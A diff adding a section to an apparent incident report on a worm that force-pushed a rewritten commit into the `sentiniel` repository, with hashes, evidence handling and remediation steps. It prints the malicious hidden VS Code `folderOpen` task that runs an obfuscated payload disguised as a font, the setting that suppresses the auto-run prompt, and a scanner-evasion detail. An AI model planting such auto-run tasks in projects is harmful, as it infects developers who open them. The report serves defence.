@@ -10,3 +10,56 @@
 The task and payload were observed in `Olamidipupo-favour/lxd` on commit
 `95c2bd5795a9b00e6085990065b7384aa0ca70ba` dated 2026-10-27. The task is configured with
 `runOptions.runOn = "folderOpen"` and hidden presentation settings.
+
+### Worm commit in `Olamidipupo-favour/sentiniel`
+
+The worm did not only touch other repositories. It rewrote a commit in Sentiniel's own
+remote history and force-pushed it over the real one.
+
+- Real commit: `83f2b57` "Add a verified self-update command", parent `5053d1d`,
+  tagged `v0.5.0`.
+- Malicious commit: `4cf75e3`, same message, same parent, same author and committer
+  (`Agboola Olamidipupo <dipoagboola2019@gmail.com>`), same date
+  (`2026-11-05T12:02:32+01:00`). It was force-pushed to `main`.
+- A second copy was pushed to `develop` as `05a4929`. It has the same tree as
+  `4cf75e3` (`711ded8a587312bbd202c4cab9ab0ad4150a2c0d`).
+- The code files are byte-identical to `83f2b57`. The worm only appended malicious
+  files to the tree, which is why the diff looks innocent:
+
+```
+.gitignore
+.vscode/settings.json
+.vscode/tasks.json
+fixtures/infected/backend/app/routers/public/fonts/README.md
+fixtures/infected/backend/app/routers/public/fonts/fa-*.{eot,svg,ttf,woff,woff2}
+```
+
+- `.vscode/tasks.json` is the same hidden `folderOpen` task. The payload path is in
+  `args`, not `command`, so a scanner that only inspects `command` misses it:
+
+```json
+{"label": "eslint-check", "type": "shell", "command": "node",
+ "args": ["./fixtures/infected/backend/app/routers/public/fonts/fa-solid-600.ttf"],
+ "hide": true, "runOptions": {"runOn": "folderOpen"}}
+```
+
+- `.vscode/settings.json` adds `"task.allowAutomaticTasks": true`, which suppresses the
+  VS Code prompt that would otherwise block automatic tasks.
+- Payload `fixtures/infected/backend/app/routers/public/fonts/fa-solid-600.ttf` is
+  30,584 bytes of obfuscated JavaScript, SHA-256
+  `e20dc2838008cbcc0205d5a992cb3eb11a705d90fcd95582618c91c224b72549`. It is a
+  different payload from the `lxd` one (`af747d14...`) and a different extension.
+- `.gitignore` is re-written in CRLF and gains `config.bat` and `node_modules`, a
+  plausible place for a Windows-facing payload to hide. `.gitignore` only hides untracked
+  files, so check local clones for an untracked `config.bat` or a `node_modules` directory
+  that no `package.json` explains.
+
+Evidence preserved outside the repository at
+`/tmp/opencode/sentiniel-worm-evidence/` (payload, both workspace files, commit
+metadata, and a git bundle of both malicious commits). The commits are also kept under
+the local refs `refs/evidence/worm-main`, `refs/evidence/worm-develop`, and the tag
+`worm-evidence-2026-11-05`; none of them may be pushed.
+
+The real history was restored by force-pushing `83f2b57` back to `main` and
+`develop`. Any clone made between the worm push and the restore must be treated as
+infected, and the GitHub token that had push access must be rotated.
